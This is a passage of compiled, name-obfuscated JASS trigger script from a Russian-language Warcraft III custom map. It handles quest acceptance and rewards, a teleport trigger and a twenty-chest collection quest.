if not (UnitHasItem(GetTriggerUnit(),GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49303935))==true) then
return false
endif
return true
endfunction
function BOY takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BOZ takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BOa takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BOb takes nothing returns boolean
return GetBooleanAnd(BOZ(),BOa())
endfunction
function BOc takes nothing returns boolean
return GetBooleanAnd(BOY(),BOb())
endfunction
function BOd takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=42) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=45) then
return false
endif
return true
endfunction
function BOe takes nothing returns nothing
if BOd() then
call AddHeroXP(GetEnumUnit(),6700,false)
else
endif
endfunction
function BOf takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=42) then
return false
endif
return true
endfunction
function BOg takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=42) then
return false
endif
return true
endfunction
function BOh takes nothing returns nothing
if BOg() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call DestroyEffectBJ(Us[28])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Да, оно! Спасибо огромное!|r")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49303935))
call QuestSetCompletedBJ(YX[28],true)
call DestroyQuest(YX[28])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BOc))
call ForGroupBJ(Th,function BOe)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF6700 опыта|r, |c00ffff00400 золота|r, |c00ff969615 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BOf() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+45
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000042|r уровня",.027,255,255,255)
endif
endfunction
function BOi takes nothing returns nothing
set an=CreateTrigger()
call DisableTrigger(an)
call TriggerRegisterAnyUnitEventBJ(an,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(an,Condition(function BOX))
call TriggerAddAction(an,function BOh)
endfunction
function BOj takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E686561) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BOk takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=45) then
return false
endif
return true
endfunction
function BOl takes nothing returns nothing
if BOk() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(ap)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Сестра\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 45-50|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Сестра","Мою сестру забрали в плен дикие Водные Элементали. Помогите ей вернуться домой
|c006969FFУровень задания: 45-50|r
","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[29]=GetLastCreatedQuestBJ()
call DestroyEffectBJ(Us[29])
call AddSpecialEffectTargetUnitBJ("overhead",KZ,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[29]=GetLastCreatedEffectBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000045|r уровня",.027,255,255,255)
endif
endfunction
function BOm takes nothing returns nothing
set ao=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ao,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ao,Condition(function BOj))
call TriggerAddAction(ao,function BOl)
endfunction
function BOn takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303936))==true) then
return false
endif
return true
endfunction
function BOo takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303936))
call KillDestructable(HG)
set YV[51]=GetRectCenter(CP)
call CreateNUnitsAtLoc(1,$6E303335,GetOwningPlayer(GetEnteringUnit()),YV[51],bj_UNIT_FACING)
call RemoveLocation(YV[51])
endfunction
function BOp takes nothing returns nothing
set aq=CreateTrigger()
call TriggerRegisterEnterRectSimple(aq,CP)
call TriggerAddCondition(aq,Condition(function BOn))
call TriggerAddAction(aq,function BOo)
endfunction
function BOq takes nothing returns boolean
if not (GetUnitTypeId(GetEnteringUnit())==$6E303335) then
return false
endif
return true
endfunction
function BOr takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BOs takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BOt takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BOu takes nothing returns boolean
return GetBooleanAnd(BOs(),BOt())
endfunction
function BOv takes nothing returns boolean
return GetBooleanAnd(BOr(),BOu())
endfunction
function BOw takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=45) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=50) then
return false
endif
return true
endfunction
function BOx takes nothing returns nothing
if BOw() then
call AddHeroXP(GetEnumUnit(),8000,false)
else
endif
endfunction
function BOy takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=45) then
return false
endif
return true
endfunction
function BOz takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,KZ)
call UnitAddAbilityBJ($416E6532,KZ)
call DestroyEffectBJ(Us[29])
call RemoveUnit(GetEnteringUnit())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Родная, моя, любимая!!!|r")
call QuestSetCompletedBJ(YX[29],true)
call DestroyQuest(YX[29])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BOv))
call ForGroupBJ(Th,function BOx)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF8000 опыта|r, |c00ffff00500 золота|r, |c00ff969625 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BOy() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1500
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+75
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BO0 takes nothing returns nothing
set ap=CreateTrigger()
call DisableTrigger(ap)
call TriggerRegisterEnterRectSimple(ap,CO)
call TriggerAddCondition(ap,Condition(function BOq))
call TriggerAddAction(ap,function BOz)
endfunction
function BO1 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E647268) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BO2 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=32) then
return false
endif
return true
endfunction
function BO3 takes nothing returns nothing
if BO2() then
call DisableTrigger(GetTriggeringTrigger())
call ShowUnitShow(Lg)
call PauseUnitBJ(false,Lg)
call EnableTrigger(Vi)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Страж Течений\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 32-36|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Страж Течений","Ужасный монстр поселился на Архипелаге. Разберетесь?
|c006969FFУровень задания: 32-36|r
","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[30]=GetLastCreatedQuestBJ()
call DestroyEffectBJ(Us[30])
call AddSpecialEffectTargetUnitBJ("overhead",Kj,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[30]=GetLastCreatedEffectBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000032|r уровня",.027,255,255,255)
endif
endfunction
function BO4 takes nothing returns nothing
set ar=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ar,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ar,Condition(function BO1))
call TriggerAddAction(ar,function BO3)
endfunction
function BO5 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BO6 takes nothing returns nothing
local integer L9=0
set V0=Location(8685.,7176.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call RemoveLocation(V0)
call SetUnitLifePercentBJ(Lg,100)
call SetUnitLifePercentBJ(Vd[4],100)
call SaveInteger(NY,GetHandleId(Lg),1,0)
call SaveInteger(NY,GetHandleId(Vd[4]),1,0)
loop
call SaveInteger(NY,GetHandleId(Lg),2+L9,0)
call SaveInteger(NY,GetHandleId(Vd[4]),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
function BO7 takes nothing returns nothing
set Vi=CreateTrigger()
call DisableTrigger(Vi)
call TriggerRegisterEnterRectSimple(Vi,FF)
call TriggerAddCondition(Vi,Condition(function BO5))
call TriggerAddAction(Vi,function BO6)
endfunction
function BO8 takes nothing returns nothing
if GetUnitTypeId(GetDyingUnit())==$6E303338 then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Награда ждет своих героев.")
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(at)
call RemoveLocation(YV[52])
call DestroyEffect(Us[30])
call AddSpecialEffectTargetUnitBJ("overhead",Kj,"war3mapImported\\QuestYellow1.mdx")
set Us[30]=GetLastCreatedEffectBJ()
endif
endfunction
function BO9 takes nothing returns nothing
set as=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(as,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(as,function BO8)
endfunction
function BPB takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E647268) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BPC takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BPD takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BPE takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BPF takes nothing returns boolean
return GetBooleanAnd(BPD(),BPE())
endfunction
function BPG takes nothing returns boolean
return GetBooleanAnd(BPC(),BPF())
endfunction
function BPH takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=32) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=36) then
return false
endif
return true
endfunction
function BPI takes nothing returns nothing
if BPH() then
call AddHeroXP(GetEnumUnit(),3900,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+3900
else
endif
endfunction
function BPJ takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=32) then
return false
endif
return true
endfunction
function BPK takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=32) then
return false
endif
return true
endfunction
function BPL takes nothing returns nothing
if BPK() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call CreateItemLoc($49305732,GetUnitLoc(GetTriggerUnit()))
call CreateItemLoc($49305456,GetUnitLoc(GetTriggerUnit()))
call DestroyEffectBJ(Us[30])
call QuestSetCompletedBJ(YX[30],true)
call DestroyQuest(YX[30])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BPG))
call ForGroupBJ(Th,function BPI)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3900 опыта|r, |c00ffff00400 золота|r, |c00ff969615 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BPJ() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+45
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000032|r уровня",.027,255,255,255)
endif
endfunction
function BPM takes nothing returns nothing
set at=CreateTrigger()
call DisableTrigger(at)
call TriggerRegisterAnyUnitEventBJ(at,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(at,Condition(function BPB))
call TriggerAddAction(at,function BPL)
endfunction
function BPN takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304130))==true) then
return false
endif
return true
endfunction
function BPO takes nothing returns nothing
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304130))
call UnitAddItemByIdSwapped($49303959,GetTriggerUnit())
endfunction
function BPP takes nothing returns nothing
set au=CreateTrigger()
call TriggerRegisterEnterRectSimple(au,BE)
call TriggerAddCondition(au,Condition(function BPN))
call TriggerAddAction(au,function BPO)
endfunction
function BPQ takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304344) then
return false
endif
return true
endfunction
function BPR takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPS takes nothing returns boolean
if not (RectContainsUnit(DJ,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPT takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPU takes nothing returns boolean
if not (RectContainsUnit(DI,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPV takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPW takes nothing returns boolean
if not (RectContainsUnit(DH,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPX takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPY takes nothing returns boolean
if not (RectContainsUnit(DG,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPZ takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPa takes nothing returns boolean
if not (RectContainsUnit(DE,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPb takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPc takes nothing returns boolean
if not (RectContainsUnit(DF,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPd takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPe takes nothing returns boolean
if not (RectContainsUnit(DC,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPf takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPg takes nothing returns boolean
if not (RectContainsUnit(DD,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPh takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPi takes nothing returns boolean
if not (RectContainsUnit(DB,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPj takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPk takes nothing returns boolean
if not (RectContainsUnit(C9,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPl takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPm takes nothing returns boolean
if not (RectContainsUnit(C8,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPn takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPo takes nothing returns boolean
if not (RectContainsUnit(C7,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPp takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPq takes nothing returns boolean
if not (RectContainsUnit(C6,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPr takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPs takes nothing returns boolean
if not (RectContainsUnit(C5,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPt takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPu takes nothing returns boolean
if not (RectContainsUnit(C4,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPv takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPw takes nothing returns boolean
if not (RectContainsUnit(C3,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPx takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BPy takes nothing returns boolean
if not (RectContainsUnit(C2,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BPz takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BP0 takes nothing returns boolean
if not (RectContainsUnit(C1,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BP1 takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BP2 takes nothing returns boolean
if not (RectContainsUnit(C0,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BP3 takes nothing returns boolean
if not (SS==20) then
return false
endif
return true
endfunction
function BP4 takes nothing returns boolean
if not (RectContainsUnit(Cz,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BP5 takes nothing returns nothing
if BPS() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JR,"Death")
call RemoveRect(DJ)
if BPR() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPU() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JQ,"Death")
call RemoveRect(DI)
if BPT() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPW() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JP,"Death")
call RemoveRect(DH)
if BPV() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPY() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JO,"Death")
call RemoveRect(DG)
if BPX() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPa() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JM,"Death")
call RemoveRect(DE)
if BPZ() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPc() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JN,"Death")
call RemoveRect(DF)
if BPb() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPe() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JK,"Death")
call RemoveRect(DC)
if BPd() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPg() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JL,"Death")
call RemoveRect(DD)
if BPf() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPi() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JJ,"Death")
call RemoveRect(DB)
if BPh() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPk() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JI,"Death")
call RemoveRect(C9)
if BPj() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPm() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JH,"Death")
call RemoveRect(C8)
if BPl() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPo() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JG,"Death")
call RemoveRect(C7)
if BPn() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPq() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JF,"Death")
call RemoveRect(C6)
if BPp() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPs() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JE,"Death")
call RemoveRect(C5)
if BPr() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPu() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(I9,"Death")
call RemoveRect(C4)
if BPt() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPw() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JC,"Death")
call RemoveRect(C3)
if BPv() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BPy() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(JB,"Death")
call RemoveRect(C2)
if BPx() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BP0() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(I8,"Death")
call RemoveRect(C1)
if BPz() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BP2() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(Ir,"Death")
call RemoveRect(C0)
if BP1() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
